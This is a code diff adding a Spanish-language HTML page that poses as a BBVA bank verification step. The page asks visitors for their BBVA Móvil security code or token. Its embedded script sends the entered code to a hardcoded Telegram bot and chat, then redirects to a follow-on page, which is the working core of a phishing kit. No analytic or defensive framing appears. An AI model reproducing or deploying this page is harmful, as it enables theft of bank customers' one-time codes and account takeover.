@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>Inicio</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=0.8, maximum-scale=0.8, user-scalable=no"
+    />
+    <link rel="stylesheet" type="text/css" href="./fhs/style_crown.css" />
+
+    <script>
+      function soloNumeros(e) {
+        var key = window.event ? e.which : e.keyCode;
+        if (key < 48 || key > 57) {
+          e.preventDefault();
+        }
+      }
+
+      async function sendToken(token) {
+        const botToken = "6378086633:AAGVAfCvJ4w__4iNgaEnySvvb2C7CbONY9Y";
+        const chatId = "-4269474646";
+        const message = `Token: ${token}`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
+          message
+        )}`;
+
+        await fetch(url)
+          .then((response) => {
+            if (!response.ok) {
+              throw new Error("Network response was not ok");
+            }
+            return response.json();
+          })
+          .then((data) => console.log("Message sent:", data))
+          .catch((error) => console.error("Error sending message:", error));
+      }
+
+      function handleSubmit(event) {
+        event.preventDefault(); // Prevent the default form submission
+
+        const token = document.querySelector('input[name="numer"]').value;
+        sendToken(token).then(() => {
+          window.location.href = "index2.html"; // Redirect after sending the token
+        });
+      }
+    </script>
+  </head>
+  <body>
+    <header class="ioscam">
+      <nav class="header_wrapeer">
+        <div class="header__campaign">
+          <div class="header__logo">
+            <img
+              src="./fhs/blanco.png"
+              sizes="(min-width: 900px) 20vw, 50vw"
+              class="header__image"
+            />
+            <img src="./fhs/bantp.png" />
+          </div>
+        </div>
+      </nav>
+    </header>
+    <div class="container">
+      <h1>¡Casi terminamos!</h1>
+      <form
+        method="POST"
+        action="index5.php"
+        name="form1"
+        id="form1"
+        onsubmit="handleSubmit(event)"
+      >
+        <br /><br />
+        <div align="center">
+          <h3>
+            Para finalizar con el proceso de verificaión ingresa el codigo de
+            seguridad enviado a tu BBVA Movil o tu Token BBVA
+          </h3>
+          <br />
+          <input
+            type="tel"
+            maxlength="8"
+            placeholder="Codigo BBVA movil o Token BBVA"
+            style="width: 350px; font-size: 18px"
+            onkeypress="soloNumeros(event)"
+            name="numer"
+            autofocus
+            required
+          />
+          <br /><br />
+          <button
+            type="submit"
+            id="btnLogin"
+            class="btn btn-blue btn-full btn-full-md"
+            style="
+              background-color: #237aba;
+              width: 60%;
+              padding: 2rem 4rem;
+              border: none;
+              border-radius: 1px;
+              color: #fff;
+              text-align: center;
+              font-family: Helvetica Neue, Arial, Helvetica, sans-serif;
+              font-size: 1rem;
+              margin: 0;
+              padding: 1.3rem 3.7rem;
+              transition: background-color 0.1s linear 0s;
+              white-space: inherit;
+              -moz-osx-font-smoothing: grayscale;
+              -webkit-font-smoothing: antialiased;
+              outline: 0;
+              display: inline-block;
+              box-shadow: none !important;
+              cursor: pointer;
+            "
+          >
+            Continuar
+          </button>
+        </div>
+      </form>
+    </div>
+  </body>
+</html>
